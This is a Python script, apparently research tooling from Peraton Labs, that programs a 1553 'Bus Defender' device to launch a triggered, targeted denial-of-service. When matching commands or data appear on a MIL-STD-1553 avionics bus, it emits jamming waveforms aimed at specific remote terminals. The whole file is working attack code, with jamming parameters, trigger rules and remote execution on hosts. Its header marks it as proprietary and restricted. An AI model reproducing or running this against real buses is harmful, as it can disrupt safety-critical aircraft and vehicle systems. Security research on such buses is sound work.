#!/usr/bin/python3
#
# ++Copyright Peraton LABS GPR++
#
# Copyright (c) 2020 Peraton Labs
# All rights reserved.
#
# This Software contains proprietary information of Peraton Labs that
# shall be distributed, routed or made available solely to authorized
# persons having a need to know within Peraton Labs and the US
# Government, except with the written permission of Peraton Labs.
#
# - -Copyright Peraton LABS GPR- -
#
# Triggered targeting -- Start targeted DoS when a desired state is reached
#


import argparse
import subprocess
import shlex
import sys
from bd_1553gen import *

def auto_int(x):
    return int(x, 0)


parser = argparse.ArgumentParser()
parser.add_argument('--onceonly', action='store_true', help='Send only one frame')
parser.add_argument('--verbose', action='count', help='Increasing levels of verbosity')
parser.add_argument('--outlines', default=0x5, type=auto_int, help='Lines to transmit on bitfield')
parser.add_argument('--inlines', default=0x5, type=auto_int, help='Lines to listen on bitfield')
parser.add_argument('--host', action='append', help='Host to auto-execute program on (empty-string performs direct execution)')
parser.add_argument('--hostwait', action='store_true', help='Prompt for continuation before poke')
parser.add_argument('--logtest', action='append', help='Specify (repeated arguments) logtest arguments')
parser.add_argument('--secure', action='store_true', help='Run wavegen on a BD that uses /secure')
parser.add_argument('--reset', action='store_true', help='Stop wavegen execution')
args = parser.parse_args()


inports = []
for port in range(32):
    if ((1 << port) & args.inlines):
        inports.append(port)

p = wavegen_link(defaultlines=args.outlines)
p.addgroup("init", predelay=-1, postgoto="init")

######################################################################
# Targeted DoS (partial word)
#     Targeted DoS at 3MHz for 8.3 ųs
cmd = []
cmd.append(wavegen_code.txvar(1, 33, 0x155, 0x3ff))
cmd.append(wavegen_code.txcont(0, 0x5555, 0x7fff))

g="TARGET DoS"
p.addgroup(g, cmds=cmd, postgoto="init")
p.link(resetonly=args.reset)

# Generate/execute Bus Defender configuration if necessary
bdconfig = busDefenderEffector.genbdconfig(inports=inports, wavegen_addressmap=p.addresses,
                       acl=[
                           # type len src ssub dst ddsubst region off len op and
                           (g, ("any", -1, -1, -1, -1, -1, "cmd1", 0, 5, "=", 1)),  # Target RT1 (part one)
                           (g, ("any", -1, -1, -1, -1, -1, "cmd2", 0, 5, "=", 1)),  # Target RT1 (part two)
                           (g, ("any", -1, -1, -1, 2, 1, "data", 0, 32, "=", 0x4F47444F)),  # Target anyone sending --set-data 1=GOOD... to RT 2R1 (xmit on wire as 4F 47 44 4F)
                       ])

bde = busDefenderEffector(args.host, secure=args.secure, logtest=args.logtest, verbose=args.verbose)
bde.runcmd(["--config", "-"], logtest=True, stdin=bdconfig)

if args.hostwait:
    input("Press return to program/start microcode")

# Generate/execute programs
bde.runcmd(cmd=p.shellcmd(resetonly=args.reset), logtest=False)

if args.host is None or args.verbose:
    print(bdconfig)
    p.debugpoke(resetonly=args.reset)
    p.gotomap(resetonly=args.reset)
